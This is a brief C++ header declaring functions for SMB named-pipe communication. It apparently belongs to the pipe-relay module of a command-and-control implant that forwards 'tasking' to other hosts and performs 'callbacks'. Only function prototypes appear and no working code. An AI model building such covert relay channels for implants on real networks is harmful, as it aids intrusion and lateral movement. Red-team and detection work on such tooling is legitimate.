#pragma once
#include "Core.h"

DWORD PrepareSMB(State & state);
std::string GetForwardingTarget(std::string &inboundData);
DWORD ForwardTasking(std::string targetIP, std::string outboundData, std::string & returnData, State & state);
DWORD SMBWrite(HANDLE hPipe, State & state, std::string outData);
std::string SMBRead(HANDLE hPipe, State & state, DWORD seconds);
std::string PerformSMBCallback(State & state, std::string &outboundData);
DWORD WaitForPipe(HANDLE hPipe, DWORD timeout);
